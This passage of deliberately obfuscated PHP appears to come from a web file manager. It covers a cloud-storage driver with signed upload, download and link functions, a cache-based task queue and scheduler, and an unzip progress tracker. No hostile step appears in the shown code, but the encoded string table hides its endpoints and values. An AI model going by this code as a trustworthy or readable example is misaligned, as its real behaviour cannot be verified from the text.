($λΕδΔ„) { $·ΐ΅›Ώ += $­ϋ·Π»Ί; $³„½΅¦ += $σζΤ—·; if ($ΌΩος < $­’Ρί”φ) { break; } continue; } if ($δΓϋΩ…ΐ) { if ($σζΤ—·) { return !0; } } else { if ($­ϋ·Π»Ί) { return !0; } } if ($ΌΩος < $­’Ρί”φ) { break; } } if ($λΕδΔ„) { return array($Έόμ΄Τ[242] => $³„½΅¦, $Έόμ΄Τ[243] => $·ΐ΅›Ώ); } return !1; } public function listAll($²…ΎΒ½Η) { $π¥Γ·Ψ† =& $_SERVER[γγάψ½]; $ΈέηΪ = $“‘ϊ ΒΤ = array(); $this->fileList($²…ΎΒ½Η, $ΈέηΪ, $“‘ϊ ΒΤ, !0); $γ¥Ρ·¨Υ = array_to_keyvalue($“‘ϊ ΒΤ, $π¥Γ·Ψ†[32]); foreach ($ΈέηΪ as $½ΙσΤ) { if (is_string($½ΙσΤ)) { $γ¥Ρ·¨Υ[$½ΙσΤ] = array($π¥Γ·Ψ†[79] => 0); } } return $this->listAllFiles($²…ΎΒ½Η, $γ¥Ρ·¨Υ); } public function canRead($·¤Ζ­Έ) { return $this->exist($·¤Ζ­Έ) ? !0 : !1; } public function canWrite($ηΗ•Ί) { return $this->exist($ηΗ•Ί) ? !0 : !1; } public function getContent($γω±®‘κ) { return $this->fileSubstr($γω±®‘κ, 0, -1); } public function setContent($ο±Δ¬β, $ύΐμ‰κ± = '') { $Ό‚νκε =& $_SERVER[γγάψ½]; if (!$ύΐμ‰κ±) { $ϊώΞοϊ§ = $this->ussRequest($ο±Δ¬β, $Ό‚νκε[291]); return $ϊώΞοϊ§[$Ό‚νκε[1308]]; } $ΝΑΠ­ηΎ = $this->tempFile($this->pathThis($ο±Δ¬β)); file_put_contents($ΝΑΠ­ηΎ, $ύΐμ‰κ±); if ($this->upload($ο±Δ¬β, $ΝΑΠ­ηΎ)) { $this->tempFileRemve($ΝΑΠ­ηΎ); return !0; } return !1; } public function fileSubstr($άν‚‘½, $ΧΎΖ«ΦΡ, $δ©‚βΡι) { $ςώπ¤•­ =& $_SERVER[γγάψ½]; if (!($‰ψ—ώΞΘ = $this->link($άν‚‘½))) { return !1; } $ΣχΌΚό = !1; if ($δ©‚βΡι > 0) { $µ”Γ– = $ΧΎΖ«ΦΡ + $δ©‚βΡι - 1; $ΣχΌΚό = array($ςώπ¤•­[1553] . $ΧΎΖ«ΦΡ . $ςώπ¤•­[465] . $µ”Γ–); } $‹Ε­†ΟΕ = url_request($‰ψ—ώΞΘ, $ςώπ¤•­[1514], !1, $ΣχΌΚό); return $‹Ε­†ΟΕ[$ςώπ¤•­[825]] ? $‹Ε­†ΟΕ[$ςώπ¤•­[1298]] : !1; } public function upload($ν‰¦Χ’Κ, $±Α°†, $άƒ―ƒ = false, $‰†“Ό¶ = REPEAT_REPLACE) { $€Γ†Ν =& $_SERVER[γγάψ½]; $¬±–€Φ = IO::size($±Α°†); if ($¬±–€Φ <= 1024 * 1024 * 200) { $λΛΫ΄ = array($€Γ†Ν[1595] . $±Α°†); $›“†£ϊΏ = $this->ussRequest($ν‰¦Χ’Κ, $€Γ†Ν[256], $λΛΫ΄); return $›“†£ϊΏ[$€Γ†Ν[1308]] ? $this->getPathOuter($ν‰¦Χ’Κ) : !1; } $³ΨΓ‘Μ¬ = 1024 * 1024 * 10; $ώ•€Έ = array($€Γ†Ν[1596], $€Γ†Ν[1597] . $¬±–€Φ, $€Γ†Ν[1598], $€Γ†Ν[1599] . $³ΨΓ‘Μ¬); $›“†£ϊΏ = $this->ussRequest($ν‰¦Χ’Κ, $€Γ†Ν[256], !1, $ώ•€Έ); if (!$›“†£ϊΏ[$€Γ†Ν[1308]]) { return !1; } $¶¬Π”Ί = $›“†£ϊΏ[$€Γ†Ν[1298]]; $Ήέ¬θφ = 0; $“›κότ = $¶¬Π”Ί[$€Γ†Ν[1600]]; $ ‚‚κϋ― = fopen($±Α°†, $€Γ†Ν[1477]); if (!$ ‚‚κϋ―) { return !1; } do { $Φηί•π = $¶¬Π”Ί[$€Γ†Ν[1601]]; fseek_64($ ‚‚κϋ―, $Ήέ¬θφ); $¥ε½•Ή = fread($ ‚‚κϋ―, $Φηί•π); $Ζεµέί€ = 0; do { $Ζεµέί€++; $¶¬Π”Ί = $this->uploadPart($ν‰¦Χ’Κ, $¶¬Π”Ί, $¥ε½•Ή); } while (!$¶¬Π”Ί && $Ζεµέί€ < 3); if (!$¶¬Π”Ί) { return !1; } $“›κότ = $¶¬Π”Ί[$€Γ†Ν[1600]]; $Ήέ¬θφ += $Φηί•π; } while ($“›κότ != -1); fclose($ ‚‚κϋ―); $ώ•€Έ = array($€Γ†Ν[1602], $€Γ†Ν[1603] . $¶¬Π”Ί[$€Γ†Ν[1604]], $€Γ†Ν[1598]); $›“†£ϊΏ = $this->ussRequest($ν‰¦Χ’Κ, $€Γ†Ν[256], !1, $ώ•€Έ); return $›“†£ϊΏ[$€Γ†Ν[1308]] ? $this->getPathOuter($ΪιγΓΖ‰) : !1; } private function uploadPart($Τ£—ΏΉή, $“μΪ€, &$υ³μ™¤ή) { $ήΓΖ­‰ =& $_SERVER[γγάψ½]; $ν΅ν¨οδ = array($ήΓΖ­‰[1605], $ήΓΖ­‰[1603] . $“μΪ€[$ήΓΖ­‰[1604]], $ήΓΖ­‰[1606] . $“μΪ€[$ήΓΖ­‰[1600]], $ήΓΖ­‰[146] . $“μΪ€[$ήΓΖ­‰[1601]]); $ΊΙΟσΠ = $this->ussRequest($Τ£—ΏΉή, $ήΓΖ­‰[256], $υ³μ™¤ή, $ν΅ν¨οδ); return !$ΊΙΟσΠ[$ήΓΖ­‰[1308]] ? $ΊΙΟσΠ[$ήΓΖ­‰[1308]] : $ΊΙΟσΠ[$ήΓΖ­‰[1298]]; } public function uploadFormData($ΕοκΨ¥, $±ΪΏτ = 3600) { return $this->uploadPolicy($ΕοκΨ¥, $±ΪΏτ); } public function uploadMultiData($ΚΧέΏ, $–ιζ°­ = 3600) { $μαπ‘ηΤ =& $_SERVER[γγάψ½]; $οξ¬η–‡ = (int) $GLOBALS[$μαπ‘ηΤ[7]][$μαπ‘ηΤ[79]]; return $this->uploadPolicy($ΚΧέΏ, $–ιζ°­, $οξ¬η–‡); } private function uploadPolicy($Ο΅ύΉ, $ΪοΜΑϊρ = 3600, $δΓ§ΰ± = 0) { $γ›ƒσ΄« =& $_SERVER[γγάψ½]; $—ξΨξω· = $γ›ƒσ΄«[8] . $this->bucket; $μί°Ζά = gmdate($γ›ƒσ΄«[1512]); $π…δ¥΅ = array($γ›ƒσ΄«[1607] => $this->bucket, $γ›ƒσ΄«[1608] => $Ο΅ύΉ, $γ›ƒσ΄«[1609] => time() + $ΪοΜΑϊρ, $γ›ƒσ΄«[1610] => $μί°Ζά); if ($δΓ§ΰ±) { $π…δ¥΅[$γ›ƒσ΄«[1497]] = $δΓ§ΰ±; } $Ο–¬±ήο = base64_encode(json_encode($π…δ¥΅)); $…΄‘ƒ = base64_encode(hash_hmac($γ›ƒσ΄«[1564], "\120\117\123\x54\46{$—ξΨξω·}\46{$μί°Ζά}\46{$Ο–¬±ήο}", md5("{$this->userpass}"), !0)); $σρΠ«– = array($γ›ƒσ΄«[280] => $Ο–¬±ήο, $γ›ƒσ΄«[1611] => "\x55\120\x59\x55\x4e\x20{$this->username}\x3a{$…΄‘ƒ}", $γ›ƒσ΄«[209] => $this->endpoint . $—ξΨξω·); return $σρΠ«–; } public function download($ΪΙιµ, $¨·ΖΟκ™) { $ύέξφΤώ = IO::getPathInner(IO::mkfile($¨·ΖΟκ™)); if (!($ω‹ή¨Ω± = $this->link($ΪΙιµ))) { return !1; } $†ΊλΞ­Ν = 0; $Ά¤Τ­΅β = 1024 * 200; $ω³΄‘€ = fopen($ύέξφΤώ, $_SERVER[γγάψ½][1559]); while (!0) { $τΞήΘμ = $this->fileSubstr($ΪΙιµ, $†ΊλΞ­Ν, $Ά¤Τ­΅β); if ($τΞήΘμ === !1) { return !1; } fwrite($ω³΄‘€, $τΞήΘμ); $†ΊλΞ­Ν += $Ά¤Τ­΅β; if (strlen($τΞήΘμ) < $Ά¤Τ­΅β) { break; } } fclose($ω³΄‘€); return $¨·ΖΟκ™; } public function link($‡υρρ, $¶—‚οι‘ = array()) { $οΨόχϋ» =& $_SERVER[γγάψ½]; $‡υρρ = trim($‡υρρ, $οΨόχϋ»[8]); if (!empty($this->token)) { $©ε‚κΐ = strtotime(date($οΨόχϋ»[1612])); $Ύ‘ΪΖξ = substr(md5($this->token . $οΨόχϋ»[287] . $©ε‚κΐ . $οΨόχϋ»[1613] . $‡υρρ), 12, 8) . $©ε‚κΐ; $¶—‚οι‘[] = $οΨόχϋ»[1614] . $Ύ‘ΪΖξ; } $„’Γδ“Δ = !empty($¶—‚οι‘) ? $οΨόχϋ»[76] . implode($οΨόχϋ»[287], $¶—‚οι‘) : $οΨόχϋ»[12]; return $this->getHost() . $οΨόχϋ»[8] . $this->pathEncode($‡υρρ) . $„’Γδ“Δ; } public function fileOut($»ξ‡ΈΚΥ, $ΰ†ΆΘ­Ώ = false, $’Ψ’°³ρ = false, $ƒ§†ƒ΄ω = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($»ξ‡ΈΚΥ, $ΰ†ΆΘ­Ώ, $’Ψ’°³ρ, $ƒ§†ƒ΄ω); } if (!$’Ψ’°³ρ) { $’Ψ’°³ρ = $this->pathThis($»ξ‡ΈΚΥ); } $Δ’«Ε = $ΰ†ΆΘ­Ώ ? array($_SERVER[γγάψ½][1615] . rawurlencode($’Ψ’°³ρ)) : array(); $³²εΝΘ­ = $this->link($»ξ‡ΈΚΥ, $Δ’«Ε); $this->fileOutLink($³²εΝΘ­); } public function fileOutServer($­«¦ΧξΞ, $’οΏλϊε = false, $οΞ„λ– = false, $©ύφ¤γΑ = '') { parent::fileOut($­«¦ΧξΞ, $’οΏλϊε, $οΞ„λ–, $©ύφ¤γΑ); } public function fileOutImage($°­ςρ―, $ΧƒΏϊΥ = 250) { $¦¥„΄‡Ο = $this->link($°­ςρ― . $_SERVER[γγάψ½][1616] . $ΧƒΏϊΥ); $this->fileOutLink($¦¥„΄‡Ο); } public function fileOutImageServer($ωψ¥Β­, $ο½Ζ« = 250) { parent::fileOutImage($ωψ¥Β­, $ο½Ζ«); } public function hashMd5($υι»„‘ι) { $η’²θ‹ξ =& $_SERVER[γγάψ½]; $€Α™ƒ = $this->_objectMeta($υι»„‘ι); return isset($€Α™ƒ[$η’²θ‹ξ[248]]) ? $€Α™ƒ[$η’²θ‹ξ[248]] : !1; } public function size($Υα—ΨΔ) { $ΐχ¦Ή‚ώ = $this->objectMeta($Υα—ΨΔ); return $ΐχ¦Ή‚ώ ? $ΐχ¦Ή‚ώ[$_SERVER[γγάψ½][79]] : 0; } public function info($β“ξΞΪΈ) { if ($this->isFolder($β“ξΞΪΈ)) { return $this->folderInfo($β“ξΞΪΈ); } else { if ($this->isFile($β“ξΞΪΈ)) { return $this->fileInfo($β“ξΞΪΈ); } } return !1; } public function exist($ΞΡ™³ύ) { return $this->isFile($ΞΡ™³ύ) || $this->isFolder($ΞΡ™³ύ); } public function isFile($‚Χ—ρα›) { return !$this->isFolder($‚Χ—ρα›) && $this->objectMeta($‚Χ—ρα›); } public function isFolder($ΓΙέΧ­Ύ) { return $this->cacheMethod($_SERVER[γγάψ½][180], $ΓΙέΧ­Ύ); } protected function objectMeta($κ«΄κ»―) { return $this->cacheMethod($_SERVER[γγάψ½][182], $κ«΄κ»―); } protected function _objectMeta($½ΏΙζ‡) { $‚ψΚ =& $_SERVER[γγάψ½]; if ($½ΏΙζ‡ == $‚ψΚ[12] || $½ΏΙζ‡ == $‚ψΚ[8]) { return array(); } $ΧƒΪ©ς = $this->ussRequest($½ΏΙζ‡, $‚ψΚ[1617]); if (!$ΧƒΪ©ς[$‚ψΚ[1308]]) { return null; } $ΙΊΤΤ’• = isset($ΧƒΪ©ς[$‚ψΚ[1298]]) ? $ΧƒΪ©ς[$‚ψΚ[1298]] : array(); if (!isset($ΙΊΤΤ’•[$‚ψΚ[1618]])) { return null; } $‚ξΌ†ο = array($‚ψΚ[33] => isset($ΙΊΤΤ’•[$‚ψΚ[1618]]) ? $ΙΊΤΤ’•[$‚ψΚ[1618]] : null, $‚ψΚ[79] => isset($ΙΊΤΤ’•[$‚ψΚ[1619]]) ? $ΙΊΤΤ’•[$‚ψΚ[1619]] : null, $‚ψΚ[248] => isset($ΙΊΤΤ’•[$‚ψΚ[1620]]) ? $ΙΊΤΤ’•[$‚ψΚ[1620]] : null, $‚ψΚ[1587] => isset($ΙΊΤΤ’•[$‚ψΚ[1621]]) ? $ΙΊΤΤ’•[$‚ψΚ[1621]] : null); $‚ξΌ†ο[$‚ψΚ[1588]] = isset($ΙΊΤΤ’•[$‚ψΚ[1622]]) ? strtotime($ΙΊΤΤ’•[$‚ψΚ[1622]]) : $‚ξΌ†ο[$‚ψΚ[1587]]; return $‚ξΌ†ο; } protected function _isFolder($ΏµΌΥ) { $²ξ”ΪΣ =& $_SERVER[γγάψ½]; if ($ΏµΌΥ == $²ξ”ΪΣ[12] || $ΏµΌΥ == $²ξ”ΪΣ[8]) { return !0; } $ΏΘΘΨΔ‘ = $this->_objectMeta($ΏµΌΥ); return isset($ΏΘΘΨΔ‘[$²ξ”ΪΣ[33]]) && $ΏΘΘΨΔ‘[$²ξ”ΪΣ[33]] == $²ξ”ΪΣ[78] ? !0 : !1; } } goto C…±ΩΒΊ; b‡γΌΪά¤: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\x51\x75\145\165\145\114\145\x6e\147\164\x68"; const QUEUE_DATA = "\x74\141\163\x6b\x51\165\145\165\x65\104\141\164\141"; const QUEUE_TIME = "\164\x61\x73\x6b\x51\x75\145\x75\x65\114\141\x73\164\122\165\x6e"; const QUEUE_THREAD = "\164\x61\x73\x6b\x51\165\145\x75\x65\124\x68\x72\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ƒ™¬Ϋ΄ύ, $ϋΟ£Ι²‡ = array(), $ΊΈΎο = '', $ϋσ”–υ“ = '') { $λΉ¤θξφ =& $_SERVER[γγάψ½]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ϋσ”–υ“ && array_find_by_field(self::$listData, $λΉ¤θξφ[97], $ϋσ”–υ“)) { return !0; } if ($ϋσ”–υ“ && array_find_by_field(self::$listDataAdd, $λΉ¤θξφ[97], $ϋσ”–υ“)) { return !0; } self::$listDataAdd[] = array($λΉ¤θξφ[344] => $ƒ™¬Ϋ΄ύ, $λΉ¤θξφ[1893] => $ϋΟ£Ι²‡, $λΉ¤θξφ[529] => $ΊΈΎο, $λΉ¤θξφ[97] => $ϋσ”–υ“); return !0; } public static function addSubmit() { $™ΩΖ¥ =& $_SERVER[γγάψ½]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($™ΩΖ¥[1894] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $™ΩΖ¥[12], $™ΩΖ¥[529])), $™ΩΖ¥[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($™δ»ΨΎ, $β¶•Ϊ² = array(), $€φΝε‹ = '', $©Ώζΐ = '') { $“ύ½¶Ω =& $_SERVER[γγάψ½]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Τ“–·ό = self::getAll(); if ($©Ώζΐ && array_find_by_field($Τ“–·ό, $“ύ½¶Ω[97], $©Ώζΐ)) { return !0; } $Τ“–·ό[] = array($“ύ½¶Ω[344] => $™δ»ΨΎ, $“ύ½¶Ω[1893] => $β¶•Ϊ², $“ύ½¶Ω[529] => $€φΝε‹, $“ύ½¶Ω[97] => $©Ώζΐ); self::setAll($Τ“–·ό); write_log($“ύ½¶Ω[1894] . $€φΝε‹, $“ύ½¶Ω[198]); return !0; } public static function run() { $Θ‹ψ–”α =& $_SERVER[γγάψ½]; $¬οξτϋ‚ = self::getAll(); $β±τ = array_shift($¬οξτϋ‚); if (!$β±τ) { return !1; } self::setAll($¬οξτϋ‚); $Ϊ”µΜι = timeFloat(); $Ρϋ«Φ›Δ = $Θ‹ψ–”α[12]; try { $Ρϋ«Φ›Δ = Hook::apply($β±τ[$Θ‹ψ–”α[344]], $β±τ[$Θ‹ψ–”α[1893]]); } catch (Exception $²κϊχ•) { write_log($²κϊχ•, $Θ‹ψ–”α[1275]); } $άϊ΅Έξς = number_format(timeFloat() - $Ϊ”µΜι, 3) . $Θ‹ψ–”α[1809]; if ($Ρϋ«Φ›Δ && is_string($Ρϋ«Φ›Δ)) { $άϊ΅Έξς = $άϊ΅Έξς . $Θ‹ψ–”α[1895] . $Ρϋ«Φ›Δ; } write_log($Θ‹ψ–”α[1896] . $β±τ[$Θ‹ψ–”α[529]] . $Θ‹ψ–”α[1897] . $άϊ΅Έξς, $Θ‹ψ–”α[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Οβ‰α½χ =& $_SERVER[γγάψ½]; $άµωΊΏΟ = self::threadCount() + 1; if ($άµωΊΏΟ > 3 || !self::count()) { return; } write_log($Οβ‰α½χ[1898] . $άµωΊΏΟ, $Οβ‰α½χ[198]); Cache::set(self::QUEUE_THREAD, $άµωΊΏΟ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Οβ‰α½χ[1899], $Οβ‰α½χ[198]); } public static function getKey($ψ³ΰί®Ψ, $’ΑΟΦ„ = "\151\156\x74") { $Ύηγ ϋ =& $_SERVER[γγάψ½]; Cache::removeMemory($ψ³ΰί®Ψ); $’Κ«Ω…“ = Cache::get($ψ³ΰί®Ψ); if ($’ΑΟΦ„ == $Ύηγ ϋ[366]) { return $’Κ«Ω…“ ? intval($’Κ«Ω…“) : 0; } if ($’ΑΟΦ„ == $Ύηγ ϋ[1900]) { return is_array($’Κ«Ω…“) ? $’Κ«Ω…“ : array(); } return $’Κ«Ω…“; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[γγάψ½][1900]); } public static function setAll($όλΥ·Λ) { $¥‚φ―Ϊ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($όλΥ·Λ), $¥‚φ―Ϊ); Cache::set(self::QUEUE_DATA, $όλΥ·Λ, $¥‚φ―Ϊ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ή‚ΉΝΙ‘, $¬ηΏζ—ΐ = 5.0) { if (!$Ή‚ΉΝΙ‘) { return; } $κώ²τΑ = Cache::get($Ή‚ΉΝΙ‘); if (!$κώ²τΑ || timeFloat() - floatVal($κώ²τΑ) >= $¬ηΏζ—ΐ) { Cache::set($Ή‚ΉΝΙ‘, timeFloat(), $¬ηΏζ—ΐ * 10); return !0; } return !1; } public static function timeLimitCall($ΕθΣ’ΚΧ, $ΎΐΠ, $§£ζς„™, $ύ°τ€Μ = 5.0) { $¦λ’Τ―• =& $_SERVER[γγάψ½]; if (!$ΕθΣ’ΚΧ || !$ΎΐΠ) { return; } self::$asyncAdd = !0; $”ΑψαΩ = $¦λ’Τ―•[1901]; $‡σ»ΐ»‘ = Cache::get($”ΑψαΩ, !0); $½γ²― = array($¦λ’Τ―•[1902] => timeFloat(), $¦λ’Τ―•[1903] => timeFloat(), $¦λ’Τ―•[344] => $ΎΐΠ, $¦λ’Τ―•[1893] => $§£ζς„™, $¦λ’Τ―•[207] => $ύ°τ€Μ); if (is_array($‡σ»ΐ»‘[$ΕθΣ’ΚΧ])) { $½γ²―[$¦λ’Τ―•[1903]] = $‡σ»ΐ»‘[$ΕθΣ’ΚΧ][$¦λ’Τ―•[1903]]; } if (is_array($‡σ»ΐ»‘[$ΕθΣ’ΚΧ])) { if (timeFloat() - $‡σ»ΐ»‘[$ΕθΣ’ΚΧ][$¦λ’Τ―•[1902]] < $½γ²―[$¦λ’Τ―•[207]] * 0.3) { return; } $½γ²―[$¦λ’Τ―•[1903]] = $‡σ»ΐ»‘[$ΕθΣ’ΚΧ][$¦λ’Τ―•[1903]]; } $‡σ»ΐ»‘[$ΕθΣ’ΚΧ] = $½γ²―; Cache::set($”ΑψαΩ, $‡σ»ΐ»‘, 60); Cache::removeMemory($”ΑψαΩ); write_log($¦λ’Τ―•[1904] . $ΕθΣ’ΚΧ . $¦λ’Τ―•[74] . $ΎΐΠ, $¦λ’Τ―•[198]); } public static function timeLimitCallLoop() { $ϋ¤Λ‘ =& $_SERVER[γγάψ½]; $Χ‰µ”’‹ = array($ϋ¤Λ‘[1905]); $άνΊρ― = in_array(strtolower(ACTION), $Χ‰µ”’‹); if (!$άνΊρ― && !self::$asyncAdd) { return; } $ΖγρΗΰΟ = $ϋ¤Λ‘[1901]; $›€°»΅• = Cache::get($ΖγρΗΰΟ, !0); if (!$›€°»΅• || count($›€°»΅•) <= 0) { return; } $ΌΜΔ¦„° = !1; $ΐµη‹Τ = timeFloat(); $οί‡© = array(); foreach ($›€°»΅• as $ΐ¬™θ’ώ => $ό‚Ψ‹―) { if ($ΐµη‹Τ - $ό‚Ψ‹―[$ϋ¤Λ‘[1903]] > $ό‚Ψ‹―[$ϋ¤Λ‘[207]]) { $ΌΜΔ¦„° = !0; try { Hook::apply($ό‚Ψ‹―[$ϋ¤Λ‘[344]], $ό‚Ψ‹―[$ϋ¤Λ‘[1893]]); write_log($ϋ¤Λ‘[1906] . $ΐ¬™θ’ώ . $ϋ¤Λ‘[74] . $ό‚Ψ‹―[$ϋ¤Λ‘[344]] . $ϋ¤Λ‘[1907] . ACTION, $ϋ¤Λ‘[198]); } catch (Exception $ΛΧΑ‹•) { } continue; } $οί‡©[$ΐ¬™θ’ώ] = $ό‚Ψ‹―; } if (!$ΌΜΔ¦„°) { return; } if (!$οί‡©) { return Cache::remove($ΖγρΗΰΟ); } Cache::set($ΖγρΗΰΟ, $οί‡©, 60); Cache::removeMemory($ΖγρΗΰΟ); } public static function finished($­μίωψ΄, $Ύγ¶β’κ) { $΄ί³υ³ =& $_SERVER[γγάψ½]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($΄ί³υ³[344] => $­μίωψ΄, $΄ί³υ³[1893] => $Ύγ¶β’κ); } private static function finishedRun() { $ψ©¶ΉΒς =& $_SERVER[γγάψ½]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Σ›ωρΏ) { try { Hook::apply($Σ›ωρΏ[$ψ©¶ΉΒς[344]], $Σ›ωρΏ[$ψ©¶ΉΒς[1893]]); } catch (Exception $ΟςΖψΒ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $άΟ΅Ρ„Ο =& $_SERVER[γγάψ½]; parent::startAfter(); Hook::bind($άΟ΅Ρ„Ο[1908], array($this, $άΟ΅Ρ„Ο[1909])); Hook::bind($άΟ΅Ρ„Ο[1289], array($this, $άΟ΅Ρ„Ο[1910])); Hook::bind($άΟ΅Ρ„Ο[1911], array($this, $άΟ΅Ρ„Ο[1912])); $Χμπασ΄ =& $this->task; $Χμπασ΄[$άΟ΅Ρ„Ο[1913]] = $άΟ΅Ρ„Ο[1290]; if (!$Χμπασ΄[$άΟ΅Ρ„Ο[1679]]) { $Χμπασ΄[$άΟ΅Ρ„Ο[1679]] = LNG($άΟ΅Ρ„Ο[1914]); } } protected function endAfter() { $ƒξρ°έ =& $_SERVER[γγάψ½]; parent::endAfter(); Hook::unbind($ƒξρ°έ[1908], array($this, $ƒξρ°έ[1909])); Hook::unbind($ƒξρ°έ[1289], array($this, $ƒξρ°έ[1910])); Hook::unbind($ƒξρ°έ[1911], array($this, $ƒξρ°έ[1912])); } public function updateAfter() { $δ£ΞΗ‹ί =& $_SERVER[γγάψ½]; $ραφΞΤ =& $this->task; if (!$ραφΞΤ[$δ£ΞΗ‹ί[1149]] || !$ραφΞΤ[$δ£ΞΗ‹ί[838]]) { if ($ραφΞΤ[$δ£ΞΗ‹ί[1913]] != $δ£ΞΗ‹ί[391]) { return; } } if ($ραφΞΤ[$δ£ΞΗ‹ί[1913]] == $δ£ΞΗ‹ί[1290]) { $•ύ¤Ι = 0; if ($ραφΞΤ[$δ£ΞΗ‹ί[1847]]) { $•ύ¤Ι = $ραφΞΤ[$δ£ΞΗ‹ί[1848]] / $ραφΞΤ[$δ£ΞΗ‹ί[1847]]; } $ραφΞΤ[$δ£ΞΗ‹ί[1795]] = $•ύ¤Ι * 0.3; } else { if ($ραφΞΤ[$δ£ΞΗ‹ί[1913]] == $δ£ΞΗ‹ί[391]) { $•ύ¤Ι = $ραφΞΤ[$δ£ΞΗ‹ί[1794]] / $ραφΞΤ[$δ£ΞΗ‹ί[1149]]; $ραφΞΤ[$δ£ΞΗ‹ί[1795]] = 0.3 + $•ύ¤Ι * 0.4; } else { if ($ραφΞΤ[$δ£ΞΗ‹ί[1913]] == $δ£ΞΗ‹ί[110]) { $ζ€ί€ϊΥ = 0; if ($ραφΞΤ[$δ£ΞΗ‹ί[1849]] == $δ£ΞΗ‹ί[110]) { $ζ€ί€ϊΥ = $ραφΞΤ[$δ£ΞΗ‹ί[1848]]; } $•ύ¤Ι = ($ραφΞΤ[$δ£ΞΗ‹ί[1852]] + $ζ€ί€ϊΥ) / $ραφΞΤ[$δ£ΞΗ‹ί[838]]; $ραφΞΤ[$δ£ΞΗ‹ί[1795]] = 0.3 + 0.4 + $•ύ¤Ι * 0.3; } } } if ($ραφΞΤ[$δ£ΞΗ‹ί[1795]] > 0) { $ΕμΫξµƒ = timeFloat() - $ραφΞΤ[$δ£ΞΗ‹ί[1797]] - $ραφΞΤ[$δ£ΞΗ‹ί[1800]]; $ραφΞΤ[$δ£ΞΗ‹ί[1801]] = $ΕμΫξµƒ * (1 - $ραφΞΤ[$δ£ΞΗ‹ί[1795]]) / $ραφΞΤ[$δ£ΞΗ‹ί[1795]]; } } public function addFile($–ψ΅ρ) { $β¬ς™³¥ =& $_SERVER[γγάψ½]; $¨πΞμξ =& $this->task; $”Ήίζ®Ξ = IO::info($–ψ΅ρ); $¨πΞμξ[$β¬ς™³¥[1845]] = $”Ήίζ®Ξ[$β¬ς™³¥[32]]; $¨πΞμξ[$β¬ς™³¥[1847]] = $”Ήίζ®Ξ[$β¬ς™³¥[79]]; $¨πΞμξ[$β¬ς™³¥[1848]] = 0; $¨πΞμξ[$β¬ς™³¥[1151]] = $β¬ς™³¥[1868]; $¨πΞμξ[$β¬ς™³¥[1849]] = $β¬ς™³¥[1290]; $¨πΞμξ[$β¬ς™³¥[838]] = $”Ήίζ®Ξ[$β¬ς™³¥[79]]; $¨πΞμξ[$β¬ς™³¥[1149]] = 1; $κάγΣρΊ = 0; $¨πΞμξ[$β¬ς™³¥[1856]] = array($β¬ς™³¥[1857] => $κάγΣρΊ + 1, $β¬ς™³¥[497] => $”Ήίζ®Ξ[$β¬ς™³¥[32]], $β¬ς™³¥[87] => $”Ήίζ®Ξ[$β¬ς™³¥[87]], $β¬ς™³¥[587] => $”Ήίζ®Ξ[$β¬ς™³¥[587]] ? $”Ήίζ®Ξ[$β¬ς™³¥[587]] : $”Ήίζ®Ξ[$β¬ς™³¥[87]]); $this->update(); } public function zipEvent($Λη”ΈΞ, $•§λΟ‡, $Α‚ά‘«Δ, $Υϊ’ΓΦ) { $„ΥΟβΠ£ =& $_SERVER[γγάψ½]; $–ύ·’Σ =& $this->task; $–ύ·’Σ[$„ΥΟβΠ£[1845]] = get_path_this($•§λΟ‡); $–ύ·’Σ[$„ΥΟβΠ£[1847]] = $Υϊ’ΓΦ; $–ύ·’Σ[$„ΥΟβΠ£[1848]] = $Α‚ά‘«Δ; $–ύ·’Σ[$„ΥΟβΠ£[1151]] = $Λη”ΈΞ == $„ΥΟβΠ£[1915] ? $„ΥΟβΠ£[1916] : $„ΥΟβΠ£[1917]; $–ύ·’Σ[$„ΥΟβΠ£[1849]] = $„ΥΟβΠ£[12]; $–ύ·’Σ[$„ΥΟβΠ£[838]] = $Υϊ’ΓΦ; $–ύ·’Σ[$„ΥΟβΠ£[1913]] = $„ΥΟβΠ£[391]; $this->update(); } public function unzipAfter($„Λ‡ƒ°Η) { $φ¨Η†Ύ” =& $_SERVER[γγάψ½]; $ιΔµ« =& $this->task; $ιΔµ«[$φ¨Η†Ύ”[1913]] = $φ¨Η†Ύ”[110]; $π‘ΓΪ = IO::infoWithChildren($„Λ‡ƒ°Η); $·•Ε¦ = 0; $ιΔµ«[$φ¨Η†Ύ”[1856]] = array($φ¨Η†Ύ”[1857] => $·•Ε¦ + 1, $φ¨Η†Ύ”[497] => $π‘ΓΪ[$φ¨Η†Ύ”[32]], $φ¨Η†Ύ”[87] => $π‘ΓΪ[$φ¨Η†Ύ”[87]], $φ¨Η†Ύ”[587] => $π‘ΓΪ[$φ¨Η†Ύ”[587]] ? $π‘ΓΪ[$φ¨Η†Ύ”[587]] : $π‘ΓΪ[$φ¨Η†Ύ”[87]]); if ($π‘ΓΪ[$φ¨Η†Ύ”[33]] == $φ¨Η†Ύ”[233]) { 